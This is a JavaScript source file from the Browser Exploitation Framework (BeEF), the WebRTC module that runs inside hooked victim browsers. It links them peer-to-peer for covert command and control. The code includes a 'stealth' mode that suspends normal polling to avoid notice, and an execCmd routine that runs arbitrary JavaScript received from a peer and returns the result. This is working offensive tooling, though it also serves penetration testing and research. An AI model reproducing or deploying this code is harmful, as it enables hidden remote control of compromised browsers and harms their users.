//
// Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//


/**
 * @Literal object: beef.webrtc
 *
 * Manage the WebRTC peer to peer communication channels.
 * This objects contains all the necessary client-side WebRTC components,
 * allowing browsers to use WebRTC to communicate with each other.
 * To provide signaling, the WebRTC extension sets up custom listeners.
 *  /rtcsignal - for sending RTC signalling information between peers
 *  /rtcmessage - for client-side rtc messages to be submitted back into beef and logged.
 *
 * To ensure signaling gets back to the peers, the hook.js dynamic construction also includes
 * the signalling.
 *
 * This is all mostly a Proof of Concept
 */

beefrtcs = {}; // To handle multiple peers - we need to have a hash of Beefwebrtc objects
               // The key is the peer id
globalrtc = {}; // To handle multiple Peers - we have to have a global hash of RTCPeerConnection objects
                // these objects persist outside of everything else 
                // The key is the peer id
rtcstealth = false; // stealth should only be initiated from one peer - this global variable will contain:
                    // false - i.e not stealthed; or
                    // <peerid> - i.e. the id of the browser which initiated stealth mode
rtcrecvchan = {}; // To handle multiple event channels - we need to have a global hash of these
                  // The key is the peer id

// Beefwebrtc object - wraps everything together for a peer connection
// One of these per peer connection, and will be stored in the beefrtc global hash
function Beefwebrtc(initiator,peer,turnjson,stunservers,verbparam) {
    this.verbose = typeof verbparam !== 'undefined' ? verbparam : false; // whether this object is verbose or not
    this.initiator = typeof initiator !== 'undefined' ? initiator : 0; // if 1 - this is the caller; if 0 - this is the receiver
    this.peerid = typeof peer !== 'undefined' ? peer : null; // id of this rtc peer
    this.turnjson = turnjson; // set of TURN servers in the format:
                              // {"username": "<username", "password": "<password>", "uris": [
                              //    "turn:<ip>:<port>?transport=<udp/tcp>",
                              //    "turn:<ip>:<port>?transport=<udp/tcp>"]}
    this.started = false; // Has signaling / dialing started for this peer
    this.gotanswer = false; // For the caller - this determines whether they have received an SDP answer from the receiver
    this.turnDone = false; // does the pcConfig have TURN servers added to it?
    this.signalingReady = false; // the initiator (Caller) is always ready to signal. So this sets to true during init
                                 // the receiver will set this to true once it receives an SDP 'offer'
    this.msgQueue = []; // because the handling of SDP signals may happen in any order - we need a queue for them
    this.pcConfig = null; // We set this during init
    this.pcConstraints = {"optional": [{"googImprovedWifiBwe": true}]} // PeerConnection constraints
    this.offerConstraints = {"optional": [], "mandatory": {}}; // Default SDP Offer Constraints - used in the caller
    this.sdpConstraints = {'optional': [{'RtpDataChannels':true}]}; // Default SDP Constraints - used by caller and receiver
    this.gatheredIceCandidateTypes = { Local: {}, Remote: {} }; // ICE Candidates
    this.allgood = false; // Is this object / peer connection with the nominated peer ready to go?
    this.dataChannel = null; // The data channel used by this peer
    this.stunservers = stunservers; // set of STUN servers, in the format:
                                    // ["stun:stun.l.google.com:19302","stun:stun1.l.google.com:19302"]
}

// Initialize the object
Beefwebrtc.prototype.initialize = function() {
  if (this.peerid == null) {
    return 0; // no peerid - NO DICE
  }

  // Initialise the pcConfig hash with the provided stunservers
  var stuns = JSON.parse(this.stunservers);
  this.pcConfig = {"iceServers": [{"urls":stuns}]};

  // We're not getting the browsers to request their own TURN servers, we're specifying them through BeEF
  this.forceTurn(this.turnjson);

  // Caller is always ready to create peerConnection.
  this.signalingReady = this.initiator;

  // Start .. maybe 
  this.maybeStart();

  // If the window is closed, send a signal to beef .. this is not all that great, so just commenting out
  // window.onbeforeunload = function() {
  //   this.sendSignalMsg({type: 'bye'});
  // }

  return 1; // because .. yeah .. we had a peerid - this is good yar.
}

//Forces the TURN configuration (we can't query that computeengine thing because it's CORS is restrictive)
//These values are now simply passed in from the config.yaml for the webrtc extension
Beefwebrtc.prototype.forceTurn = function(jason) {
    var turnServer = JSON.parse(jason);
    var iceServers = createIceServers(turnServer.uris,
                                      turnServer.username,
                                      turnServer.password);
    if (iceServers !== null) {
        this.pcConfig.iceServers = this.pcConfig.iceServers.concat(iceServers);
    }
    if (this.verbose) {console.log("Got TURN servers, will try and maybestart again..");}
    this.turnDone = true;
    this.maybeStart();
}

// Try and establish the RTC connection
Beefwebrtc.prototype.createPeerConnection = function() {
  if (this.verbose) {
      console.log('Creating RTCPeerConnnection with the following options:\n' +
                '  config: \'' + JSON.stringify(this.pcConfig) + '\';\n' +
                '  constraints: \'' + JSON.stringify(this.pcConstraints) + '\'.');
    }
  try {
    // Create an RTCPeerConnection via the polyfill (webrtcadapter.js).
    globalrtc[this.peerid] = new RTCPeerConnection(this.pcConfig, this.pcConstraints);
    globalrtc[this.peerid].onicecandidate = this.onIceCandidate;
    if (this.verbose) {
      console.log('Created RTCPeerConnnection with the following options:\n' +
                '  config: \'' + JSON.stringify(this.pcConfig) + '\';\n' +
                '  constraints: \'' + JSON.stringify(this.pcConstraints) + '\'.');
    }
  } catch (e) {
    if (this.verbose) {
      console.log('Failed to create PeerConnection, exception: ');
      console.log(e);
    }
    return;
  }

  // Assign event handlers to signalstatechange, iceconnectionstatechange, datachannel etc
  globalrtc[this.peerid].onsignalingstatechange = this.onSignalingStateChanged;
  globalrtc[this.peerid].oniceconnectionstatechange = this.onIceConnectionStateChanged;
  globalrtc[this.peerid].ondatachannel = this.onDataChannel;
  this.dataChannel = globalrtc[this.peerid].createDataChannel("sendDataChannel", {reliable:false});
}

// When the PeerConnection receives a new ICE Candidate
Beefwebrtc.prototype.onIceCandidate = function(event) {
  var peerid = null;

  for (var k in beefrtcs) {
    if (beefrtcs[k].allgood === false) {
      peerid = beefrtcs[k].peerid;
    }
  }

  if (beefrtcs[peerid].verbose) {
    console.log("Handling onicecandidate event while connecting to peer: " + peerid + ". Event received:");
    console.log(event);
  }

  if (event.candidate) {
    // Send the candidate to the peer via the BeEF signalling channel
    beefrtcs[peerid].sendSignalMsg({type: 'candidate',
                 label: event.candidate.sdpMLineIndex,
                 id: event.candidate.sdpMid,
                 candidate: event.candidate.candidate});
    // Note this ICE candidate locally
    beefrtcs[peerid].noteIceCandidate("Local", beefrtcs[peerid].iceCandidateType(event.candidate.candidate));
  } else {
    if (beefrtcs[peerid].verbose) {console.log('End of candidates.');}
  }
}

// For all rtc signalling messages we receive as part of hook.js polling - we have to process them with this function
// This will either add messages to the msgQueue and try and kick off maybeStart - or it'll call processSignalingMessage
// against the message directly
Beefwebrtc.prototype.processMessage = function(message) {
  if (this.verbose) {
    console.log('Signalling Message - S->C: ' + JSON.stringify(message));
  }
  var msg = JSON.parse(message);

  if (!this.initiator && !this.started) { // We are currently the receiver AND we have NOT YET received an SDP Offer
    if (this.verbose) {console.log('processing the message, as a receiver');}
    if (msg.type === 'offer') { // This IS an SDP Offer
      if (this.verbose) {console.log('.. and the message is an offer .. ');}
      this.msgQueue.unshift(msg); // put it on the top of the msgqueue
      this.signalingReady = true; // As the receiver, we've now got an SDP Offer, so lets set signalingReady to true
      this.maybeStart(); // Lets try and start again - this will end up with calleeStart() getting executed
    } else { // This is NOT an SDP Offer - as the receiver, just add it to the queue
      if (this.verbose) {console.log(' .. the message is NOT an offer .. ');}
      this.msgQueue.push(msg);
    }
  } else if (this.initiator && !this.gotanswer) { // We are currently the caller AND we have NOT YET received the SDP Answer
    if (this.verbose) {console.log('processing the message, as the sender, no answers yet');}
    if (msg.type === 'answer') { // This IS an SDP Answer
        if (this.verbose) {console.log('.. and we have an answer ..');}
        this.processSignalingMessage(msg); // Process the message directly
        this.gotanswer = true; // We have now received an answer
        //process all other queued message...
        while (this.msgQueue.length > 0) {
            this.processSignalingMessage(this.msgQueue.shift());
        }
    } else { // This is NOT an SDP Answer - as the caller, just add it to the queue
        if (this.verbose) {console.log('.. not an answer ..');}
        this.msgQueue.push(msg);
    }
  } else { // For all other messages just drop them in the queue
    if (this.verbose) {console.log('processing a message, but, not as a receiver, OR, the rtc is already up');}
    this.processSignalingMessage(msg);
  } 
}

// Send a signalling message .. 
Beefwebrtc.prototype.sendSignalMsg = function(message) {
  var msgString = JSON.stringify(message);
  if (this.verbose) {console.log('Signalling Message - C->S: ' + msgString);}
  beef.net.send('/rtcsignal',0,{targetbeefid: this.peerid, signal: msgString});
}

// Used to record ICS candidates locally
Beefwebrtc.prototype.noteIceCandidate = function(location, type) {
  if (this.gatheredIceCandidateTypes[location][type])
    return;
  this.gatheredIceCandidateTypes[location][type] = 1;
  // updateInfoDiv();
}

// When the signalling state changes. We don't actually do anything with this except log it.
Beefwebrtc.prototype.onSignalingStateChanged = function(event) {
  var localverbose = false;

  for (var k in beefrtcs) {
    if (beefrtcs[k].verbose === true) {
      localverbose = true;
    }
  }

  if (localverbose === true) {console.log("Signalling has changed to: " + event.target.signalingState);}
}

// When the ICE Connection State changes - this is useful to determine connection statuses with peers.
Beefwebrtc.prototype.onIceConnectionStateChanged = function(event) {
  var peerid = null;

  for (k in globalrtc) {
    if ((globalrtc[k].localDescription.sdp === event.target.localDescription.sdp) && (globalrtc[k].localDescription.type === event.target.localDescription.type)) {
      peerid = k;
    }
  }

  if (beefrtcs[peerid].verbose) {console.log("ICE with peer: " + peerid + " has changed to: " + event.target.iceConnectionState);}

  // ICE Connection Status has connected - this is good. Normally means the RTCPeerConnection is ready! Although may still look for 
  // better candidates or connections
  if (event.target.iceConnectionState === 'connected') {
    //Send status to peer
    window.setTimeout(function() {
        beefrtcs[peerid].sendPeerMsg('ICE Status: '+event.target.iceConnectionState);
        beefrtcs[peerid].allgood = true;
        },1000);
  }

  // Completed is similar to connected. Except, each of the ICE components are good, and no more testing remote candidates is done.
  if (event.target.iceConnectionState === 'completed') {
    window.setTimeout(function() {
      beefrtcs[peerid].sendPeerMsg('ICE Status: '+event.target.iceConnectionState);
      beefrtcs[peerid].allgood = true;
    },1000);
  }

  if ((rtcstealth == peerid) && (event.target.iceConnectionState === 'disconnected')) {
    //I was in stealth mode, talking back to this peer - but it's gone offline.. come out of stealth
    rtcstealth = false;
    beefrtcs[peerid].allgood = false;
    beef.net.send('/rtcmessage',0,{peerid: peerid, message: peerid + " - has apparently gotten disconnected"});
  } else if ((rtcstealth == false) && (event.target.iceConnectionState === 'disconnected')) {
    //I was not in stealth, and this peer has gone offline - send a message
    beefrtcs[peerid].allgood = false;
    beef.net.send('/rtcmessage',0,{peerid: peerid, message: peerid + " - has apparently gotten disconnected"});
  }
  // We don't handle situations where a stealthed peer loses a peer that is NOT the peer that made it go into stealth
  // This is possibly a bad idea - @xntrik


}

// This is the function when a peer tells us to go into stealth by sending a dataChannel message of "!gostealth"
Beefwebrtc.prototype.goStealth = function() {
    //stop the beef updater
    rtcstealth = this.peerid; // this is a global variable
    beef.updater.lock = true;
    this.sendPeerMsg('Going into stealth mode');

    setTimeout(function() {rtcpollPeer()}, beef.updater.xhr_poll_timeout * 3);
}

// This is the actual poller when in stealth, it is global as well because we're using the setTimeout to execute it
rtcpollPeer = function() {
    if (rtcstealth == false) {
        //my peer has disabled stealth mode
        beef.updater.lock = false;
        return;
    }

    if (beefrtcs[rtcstealth].verbose) {console.log('lub dub');}

    beefrtcs[rtcstealth].sendPeerMsg('Stayin alive'); // This is the heartbeat we send back to the peer that made us stealth

    setTimeout(function() {rtcpollPeer()}, beef.updater.xhr_poll_timeout * 3);
}

// When a data channel has been established - within here is the message handling function as well
Beefwebrtc.prototype.onDataChannel = function(event) {
  var peerid = null;
  for (k in globalrtc) {
    if ((globalrtc[k].localDescription.sdp === event.currentTarget.localDescription.sdp) && (globalrtc[k].localDescription.type === event.currentTarget.localDescription.type)) {
      peerid = k;
    }
  }

  if (beefrtcs[peerid].verbose) {console.log("Peer: " + peerid + " has just handled the onDataChannel event");}
  rtcrecvchan[peerid] = event.channel;

  // This is the onmessage event handling within the datachannel
  rtcrecvchan[peerid].onmessage = function(ev2) {
    if (beefrtcs[peerid].verbose) {console.log("Received an RTC message from my peer["+peerid+"]: " + ev2.data);}

    // We've received the command to go into stealth mode
    if (ev2.data == "!gostealth") {
        if (beef.updater.lock == true) {
            setTimeout(function() {beefrtcs[peerid].goStealth()},beef.updater.xhr_poll_timeout * 0.4);
        } else {
            beefrtcs[peerid].goStealth();
        }

    // The message to come out of stealth
    } else if (ev2.data == "!endstealth") {

      if (rtcstealth != null) {
        beefrtcs[rtcstealth].sendPeerMsg("Coming out of stealth...");
        rtcstealth = false;
      }

    // Command to perform arbitrary JS (while stealthed)
    } else if ((rtcstealth != false) && (ev2.data.charAt(0) == "%")) {
      if (beefrtcs[peerid].verbose) {console.log('message was a command: '+ev2.data.substring(1) + ' .. and I am in stealth mode');}
      beefrtcs[rtcstealth].sendPeerMsg("Command result - " + beefrtcs[rtcstealth].execCmd(ev2.data.substring(1)));

    // Command to perform arbitrary JS (while NOT stealthed)
    } else if ((rtcstealth == false) && (ev2.data.charAt(0) == "%")) {
      if (beefrtcs[peerid].verbose) {console.log('message was a command - we are not in stealth. Command: '+ ev2.data.substring(1));}
      beefrtcs[peerid].sendPeerMsg("Command result - " + beefrtcs[peerid].execCmd(ev2.data.substring(1)));

    // Just a plain text message .. (while stealthed)
    } else if (rtcstealth != false) {
      if (beefrtcs[peerid].verbose) {console.log('received a message, apparently we are in stealth - so just send it back to peer['+rtcstealth+']');}
      beefrtcs[rtcstealth].sendPeerMsg(ev2.data);

    // Just a plan text message (while NOT stealthed)
    } else {
      if (beefrtcs[peerid].verbose) {console.log('received a message from peer['+peerid+'] - sending it back to beef');}
      beef.net.send('/rtcmessage',0,{peerid: peerid, message: ev2.data});
    }
  } 
}

// How the browser executes received JS (this is pretty hacky)
Beefwebrtc.prototype.execCmd = function(input) {
  var fn = new Function(input);
  var res = fn();
  return res.toString();
}

// Shortcut function to SEND a data messsage
Beefwebrtc.prototype.sendPeerMsg = function(msg) {
  if (this.verbose) {console.log('sendPeerMsg to ' + this.peerid);}
  this.dataChannel.send(msg);
}

// Try and initiate, will check that system hasn't started, and that signaling is ready, and that TURN servers are ready
Beefwebrtc.prototype.maybeStart = function() {
  if (this.verbose) {console.log("maybe starting ... ");}

  if (!this.started && this.signalingReady && this.turnDone) {
    if (this.verbose) {console.log('Creating PeerConnection.');}
    this.createPeerConnection();

    this.started = true;

    if (this.initiator) {
      if (this.verbose) {console.log("Making the call now .. bzz bzz");}
      this.doCall();
    } else {
      if (this.verbose) {console.log("Receiving a call now .. somebuddy answer da fone?");}
      this.calleeStart();
    }

  } else {
    if (this.verbose) {console.log("Not ready to start just yet..");}
  }
}

// RTC - create an offer - the caller runs this, while the receiver runs calleeStart()
Beefwebrtc.prototype.doCall = function() {
  var constraints = this.mergeConstraints(this.offerConstraints, this.sdpConstraints);
  var self = this;
  globalrtc[this.peerid].createOffer(this.setLocalAndSendMessage, this.onCreateSessionDescriptionError, constraints);
  if (this.verbose) {console.log('Sending offer to peer, with constraints: \n' +
              '  \'' + JSON.stringify(constraints) + '\'.');}
}

// Helper method to merge SDP constraints
Beefwebrtc.prototype.mergeConstraints = function(cons1, cons2) {
  var merged = cons1;
  for (var name in cons2.mandatory) {
    merged.mandatory[name] = cons2.mandatory[name];
  }
  merged.optional.concat(cons2.optional);
  return merged;
}

// Sets the local RTC session description, sends this information back (via signalling)
// The caller uses this to set it's local description, and it then has to send this to the peer (via signalling)
// The receiver uses this information too - and vice-versa - hence the signaling
Beefwebrtc.prototype.setLocalAndSendMessage = function(sessionDescription) {
  // This fucking function does NOT receive a 'this' state, and you can't pass additional parameters
  // Stupid .. javascript :(
  // So I'm hacking it to find the peerid gah - I believe *this* is what means you can't establish peers concurrently
  // i.e. this browser will have to wait for this peerconnection to establish before attempting to connect to the next one..
  var peerid = null;

  for (var k in beefrtcs) {
    if (beefrtcs[k].allgood === false) {
      peerid = beefrtcs[k].peerid;
    }
  }
  if (beefrtcs[peerid].verbose) {console.log("For peer: " + peerid + " Running setLocalAndSendMessage...");}

  globalrtc[peerid].setLocalDescription(sessionDescription, onSetSessionDescriptionSuccess, onSetSessionDescriptionError);
  beefrtcs[peerid].sendSignalMsg(sessionDescription);

  function onSetSessionDescriptionSuccess() {
    if (beefrtcs[peerid].verbose) {console.log('Set session description success.');}
  }

  function onSetSessionDescriptionError() {
    if (beefrtcs[peerid].verbose) {console.log('Failed to set session description');}
  }
}

// If the browser can't build an SDP
Beefwebrtc.prototype.onCreateSessionDescriptionError = function(error) {
  var localverbose = false;

  for (var k in beefrtcs) {
    if (beefrtcs[k].verbose === true) {
      localverbose = true;
    }
  }
  if (localverbose === true) {console.log('Failed to create session description: ' + error.toString());}
}

// Check for messages - which includes signaling from a calling peer - this gets kicked off in maybeStart()
Beefwebrtc.prototype.calleeStart = function() {
  // Callee starts to process cached offer and other messages.
  while (this.msgQueue.length > 0) {
    this.processSignalingMessage(this.msgQueue.shift());
  }
}

// Process messages, this is how we handle the signaling messages, such as candidate info, offers, answers
Beefwebrtc.prototype.processSignalingMessage = function(message) {
  if (!this.started) {
    if (this.verbose) {console.log('peerConnection has not been created yet!');}
    return;
  }

  if (message.type === 'offer') {
    if (this.verbose) {console.log("Processing signalling message: OFFER");}
    this.setRemote(message);
    this.doAnswer();
  } else if (message.type === 'answer') {
    if (this.verbose) {console.log("Processing signalling message: ANSWER");}
    this.setRemote(message);
  } else if (message.type === 'candidate') {
    if (this.verbose) {console.log("Processing signalling message: CANDIDATE");}
    var candidate = new RTCIceCandidate({sdpMLineIndex: message.label,
                                         candidate: message.candidate});
    this.noteIceCandidate("Remote", this.iceCandidateType(message.candidate));
    globalrtc[this.peerid].addIceCandidate(candidate, this.onAddIceCandidateSuccess, this.onAddIceCandidateError);
  } else if (message.type === 'bye') {
    this.onRemoteHangup();
  }
}

// Used to set the RTC remote session
Beefwebrtc.prototype.setRemote = function(message) {
    globalrtc[this.peerid].setRemoteDescription(new RTCSessionDescription(message),
       onSetRemoteDescriptionSuccess, this.onSetSessionDescriptionError);

  function onSetRemoteDescriptionSuccess() {
    if (this.verbose) {console.log("Set remote session description success.");}
  }
}

// As part of the processSignalingMessage function, we check for 'offers' from peers. If there's an offer, we answer, as below
Beefwebrtc.prototype.doAnswer = function() {
  if (this.verbose) {console.log('Sending answer to peer.');}
  globalrtc[this.peerid].createAnswer(this.setLocalAndSendMessage, this.onCreateSessionDescriptionError, this.sdpConstraints);
}

// Helper method to determine what kind of ICE Candidate we've received
Beefwebrtc.prototype.iceCandidateType = function(candidateSDP) {
  if (candidateSDP.indexOf("typ relay ") >= 0)
    return "TURN";
  if (candidateSDP.indexOf("typ srflx ") >= 0)
    return "STUN";
  if (candidateSDP.indexOf("typ host ") >= 0)
    return "HOST";
  return "UNKNOWN";
}

// Event handler for successful addition of ICE Candidates
Beefwebrtc.prototype.onAddIceCandidateSuccess = function() {
  var localverbose = false;

  for (var k in beefrtcs) {
    if (beefrtcs[k].verbose === true) {
      localverbose = true;
    }
  }
  if (localverbose === true) {console.log('AddIceCandidate success.');}
}

// Event handler for unsuccessful addition of ICE Candidates
Beefwebrtc.prototype.onAddIceCandidateError = function(error) {
  var localverbose = false;

  for (var k in beefrtcs) {
    if (beefrtcs[k].verbose === true) {
      localverbose = true;
    }
  }
  if (localverbose === true) {console.log('Failed to add Ice Candidate: ' + error.toString());}
}

// If a peer hangs up (we bring down the peerconncetion via the stop() method)
Beefwebrtc.prototype.onRemoteHangup = function() {
  if (this.verbose) {console.log('Session terminated.');}
  this.initiator = 0;
  // transitionToWaiting();
  this.stop();
}

// Bring down the peer connection
Beefwebrtc.prototype.stop = function() {
  this.started = false; // we're no longer started
  this.signalingReady = false; // signalling isn't ready
  globalrtc[this.peerid].close(); // close the RTCPeerConnection option
  globalrtc[this.peerid] = null; // Remove it
  this.msgQueue.length = 0; // clear the msgqueue
  rtcstealth = false; // no longer stealth
  this.allgood = false; // allgood .. NAH UH
}

// The actual beef.webrtc wrapper - this exposes only two functions directly - start, and status
// These are the methods which are executed via the custom extension of the hook.js
beef.webrtc = {
  // Start the RTCPeerConnection process
  start: function(initiator,peer,turnjson,stunservers,verbose) {
    if (peer in beefrtcs) {
      // If the RTC peer is not in a good state, try kickng it off again
      // This is possibly not the correct way to handle this issue though :/ I.e. we'll now have TWO of these objects :/
      if (beefrtcs[peer].allgood == false) {
        beefrtcs[peer] = new Beefwebrtc(initiator, peer, turnjson, stunservers, verbose);
        beefrtcs[peer].initialize();
      }
    } else {
      // Standard behaviour for new peer connections
      beefrtcs[peer] = new Beefwebrtc(initiator,peer,turnjson, stunservers, verbose);
      beefrtcs[peer].initialize();
    }
  },

  // Check the status of all my peers .. 
  status: function(me) {
    if (Object.keys(beefrtcs).length > 0) {
      for (var k in beefrtcs) {
        if (beefrtcs.hasOwnProperty(k)) {
          beef.net.send('/rtcmessage',0,{peerid: k, message: "Status checking - allgood: " + beefrtcs[k].allgood});
        }
      }
    } else {
      beef.net.send('/rtcmessage',0,{peerid: me, message: "No peers?"});
    }
  }
}
beef.regCmp('beef.webrtc');